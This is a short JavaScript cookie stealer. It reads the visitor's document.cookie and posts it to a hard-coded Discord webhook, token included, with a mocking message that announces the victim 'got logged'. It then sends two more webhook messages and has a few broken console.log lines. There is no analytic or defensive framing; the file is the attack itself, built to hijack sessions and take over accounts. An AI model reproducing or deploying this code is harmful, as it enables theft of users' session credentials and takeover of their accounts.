
    var cook = document.cookie
function sendMessage() {
    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/955958924803203082/lZqDqYa7i5dq5emS1HrP8bU7EWUJeFs2y5MJ4UPKTvO2GntqyjuK3orSyLhYoQ3yoyDd");

    request.setRequestHeader('Content-type', 'application/json');

    const params = {
      username: "penguins little helper",
      avatar_url: "",
      content: `@everyone LOL this kid got logged Cookie = ${cook}`
    }

    request.send(JSON.stringify(params));
  }
  
  function sendMessages() {
    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/955958924803203082/lZqDqYa7i5dq5emS1HrP8bU7EWUJeFs2y5MJ4UPKTvO2GntqyjuK3orSyLhYoQ3yoyDd");

    request.setRequestHeader('Content-type', 'application/json');

    const params = {
      username: "penguins little helper",
      avatar_url: "",
      content: "you can access this act with, "
    }

    request.send(JSON.stringify(params));
  }

  function sendMessag() {
    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/955958924803203082/lZqDqYa7i5dq5emS1HrP8bU7EWUJeFs2y5MJ4UPKTvO2GntqyjuK3orSyLhYoQ3yoyDd");

    request.setRequestHeader('Content-type', 'application/json');

    const params = {
      username: "penguins little helper",
      avatar_url: "",
      content: `test`

    }

    request.send(JSON.stringify(params));
  }

  sendMessage()
  console.log(ur mom,,,,)

  sendMessages()
  console.log(ur mom)

  sendMessag()
  
